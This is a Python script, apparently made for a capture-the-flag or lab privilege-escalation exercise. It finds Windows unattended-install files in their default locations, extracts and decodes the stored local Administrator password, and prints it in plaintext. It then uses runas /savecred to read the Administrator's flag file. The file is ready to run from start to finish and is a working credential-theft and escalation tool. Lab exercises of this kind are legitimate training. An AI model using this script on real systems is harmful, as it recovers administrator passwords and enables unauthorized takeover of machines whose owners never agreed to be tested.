#!/usr/bin/env python3
"""
extract_password.py

Locates Windows unattended-install files (autounattend.xml, Unattend.xml,
sysprep.inf/xml), extracts the <AdministratorPassword><Value> blob, and
decodes it to recover the plaintext local administrator password.

This is a defensive/educational tool for authorized penetration-testing labs
(e.g. Holberton privilege-escalation exercises). Only run this against
machines you are explicitly authorized to test.
"""

import os
import re
import base64
import subprocess
import sys

# ---------------------------------------------------------------------------
# 1. Typical locations for unattended installation files
# ---------------------------------------------------------------------------
CANDIDATE_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\Panther\autounattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
]

PASSWORD_RE = re.compile(
    r"<AdministratorPassword>.*?<Value>(.*?)</Value>", re.DOTALL | re.IGNORECASE
)
PLAINTEXT_RE = re.compile(
    r"<AdministratorPassword>.*?<PlainText>(.*?)</PlainText>",
    re.DOTALL | re.IGNORECASE,
)

# Windows appends this literal string to the password before Base64-encoding
# it as UTF-16LE, when PlainText is false.
OBFUSCATION_SUFFIX = "AdministratorPassword"


def find_unattend_files(extra_paths=None):
    """Return list of existing candidate files on disk."""
    paths = CANDIDATE_PATHS + (extra_paths or [])
    found = [p for p in paths if os.path.isfile(p)]
    return found


def extract_password_blob(file_path):
    """Read a file and pull out the <Value> and <PlainText> fields."""
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except OSError as e:
        print(f"[!] Could not read {file_path}: {e}")
        return None, None

    pw_match = PASSWORD_RE.search(content)
    pt_match = PLAINTEXT_RE.search(content)

    if not pw_match:
        return None, None

    value = pw_match.group(1).strip()
    plaintext_flag = pt_match.group(1).strip().lower() if pt_match else "false"
    return value, plaintext_flag


def decode_password(value, plaintext_flag):
    """Decode the extracted <Value> into a real password string."""
    if plaintext_flag == "true":
        # Already plaintext, nothing to decode
        return value

    try:
        raw = base64.b64decode(value)
        decoded = raw.decode("utf-16-le", errors="ignore")
    except Exception as e:
        print(f"[!] Base64/UTF-16 decode failed: {e}")
        return None

    # Strip the known obfuscation suffix if present
    if decoded.endswith(OBFUSCATION_SUFFIX):
        decoded = decoded[: -len(OBFUSCATION_SUFFIX)]

    return decoded


def launch_admin_session(username, password, command):
    """
    Use runas /savecred (or a scripted alternative) to run `command`
    as the given user.

    Note: Windows' native `runas` does not accept a password on the
    command line for security reasons. We use `runas /savecred` after
    priming the credential cache once, or fall back to a small helper
    that feeds the password via stdin using tools like `runas` +
    `PsExec`/`RunAsUser` style automation if available.
    """
    print(f"[*] Attempting to run as {username}: {command}")

    # First-time use: this will prompt once, then cache the credential
    # for subsequent /savecred calls.
    runas_cmd = [
        "runas",
        f"/user:{username}",
        "/savecred",
        command,
    ]

    try:
        subprocess.run(runas_cmd, check=True)
    except FileNotFoundError:
        print("[!] 'runas' not found - this script must run on the Windows target.")
    except subprocess.CalledProcessError as e:
        print(f"[!] runas failed: {e}")
        print("    You may need to run once interactively to seed /savecred,")
        print(f"    entering the recovered password manually: {password}")


def main():
    print("[*] Scanning for unattended installation files...\n")
    files = find_unattend_files()

    if not files:
        print("[!] No unattended install files found in default locations.")
        sys.exit(1)

    for f in files:
        print(f"[+] Found: {f}")

    recovered = None

    for f in files:
        value, plaintext_flag = extract_password_blob(f)
        if not value:
            continue

        print(f"\n[*] Encoded/raw value found in {f}:")
        print(f"    {value}")

        decoded = decode_password(value, plaintext_flag)
        if decoded:
            print(f"[+] Decoded password: {decoded}")
            recovered = decoded
            break

    if not recovered:
        print("\n[!] Could not recover a password from any unattend file.")
        sys.exit(1)

    # Command to grab the flag from the Administrator's desktop
    flag_cmd = 'cmd /c type "C:\\Users\\Administrator\\Desktop\\flag.txt" > C:\\Users\\Public\\flag_out.txt'

    print(f"\n[*] Recovered credential -> Administrator : {recovered}")
    print("[*] Launching elevated session to retrieve flag...")
    launch_admin_session("Administrator", recovered, flag_cmd)

    print("\n[*] Done. Check C:\\Users\\Public\\flag_out.txt for the flag "
          "(or the runas-launched window if it opened interactively).")


if __name__ == "__main__":
    main()
